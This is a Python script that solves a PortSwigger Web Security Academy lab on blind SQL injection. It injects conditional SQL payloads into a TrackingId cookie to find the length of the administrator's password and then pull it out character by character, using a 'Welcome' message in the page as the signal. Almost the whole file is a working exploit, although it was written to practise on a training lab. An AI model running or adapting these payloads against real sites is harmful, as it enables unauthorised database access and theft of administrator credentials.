# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Be sure to replace the URL, the Session Cookie and the Tracking ID cookie with your own.
# Huge help from Neisan and Haxguy. Couldn't have do it with out you.



import requests
import string

#Replace this Section with your URL and Cookies
Cquery = "1UD2ou412FxzwwoT"
SessionToken = 'm3wHlyH6OYEiuq8f1aOBLhWLb5C4H2qI'
url = 'https://aca11f2c1ed55af7801b4f04003700a5.web-security-academy.net/'


#Single Queary Requests. 
def basic_q(q):
	
	Mquery = q
	cookiesStuff = {'TrackingId':Cquery+Mquery,'session':SessionToken}
	r = requests.get(url,cookies=cookiesStuff)
	print(Cquery+Mquery)
	print(r.text.find('Welcome'))


#Password Legnth Checker
def passwordLength():
	for x in range (0,40):
		
		Mquery = f"""' AND (SELECT 'a' FROM users WHERE username='administrator' and Length(password)={x} )='a"""
		cookiesStuff = {'TrackingId':Cquery+Mquery,'session':SessionToken}
		r = requests.get(url,cookies=cookiesStuff)
		print(r.text.find('Welcome'), "Testing " , x)
		print(r.status_code)
		
		
def split(word): 
    return [char for char in word]  		

def passwordbrute():
	char = split(string.printable)
	
	Found_password = ""
	
	for x in range(1,21):
		for y in char:
			Mquery = f"""' AND (SELECT SUBSTRING(password,1,{x}) from users WHERE username='administrator')='{Found_password}{y}' --"""
			cookiesStuff = 		{'TrackingId':Cquery+Mquery,'session':SessionToken}
			r = requests.get(url,cookies=cookiesStuff)
			print(str(r.text.find('Welcome')) + " --- StatusCode:" + str(r.status_code))
			print(Mquery)
			
			if (r.text.find('Welcome') != -1):
				Found_password = Found_password + y
				print(f"\r\nCharacter Found: {y} ({x}/20 Characters Found). Current Password is: {Found_password}\r\n")
				break
		
		
passwordbrute()

